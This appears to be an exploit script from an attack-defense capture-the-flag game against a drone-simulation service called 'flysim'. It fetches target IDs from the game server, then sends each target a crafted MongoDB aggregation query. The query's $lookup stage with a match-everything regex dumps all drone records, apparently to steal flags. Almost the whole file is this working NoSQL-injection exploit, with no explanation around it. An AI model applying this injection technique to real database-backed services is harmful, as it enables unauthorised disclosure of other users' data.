#!/usr/bin/env python3

import requests
import sys
import drone_client
import time
import json


def droneid_to_drone_obj(client, drone_id):
    det = client.get_drones_with_details(json.dumps([{"$match": {}}]))
    for d in det:
        if d["id"] == drone_id:
            return d
    return None


IP = sys.argv[1]
drone_ids = requests.get("http://10.10.10.10/api/client/attack_data/").json()["flysim"][
    IP
]
for drone_id in drone_ids[::-1]:
    client = drone_client.DroneClient(ip=IP)
    drone_obj = droneid_to_drone_obj(client, drone_id)
    det = client.get_drones_with_details(
        json.dumps(
            [
                {"$match": {"label": drone_obj["label"]}},
                {
                    "$lookup": {
                        "from": "drones",
                        "as": "result",
                        "pipeline": [{"$match": {"label": {"$regex": "^.*"}}}],
                    }
                },
            ]
        )
    )

    print(det, flush=True)
    exit(0)
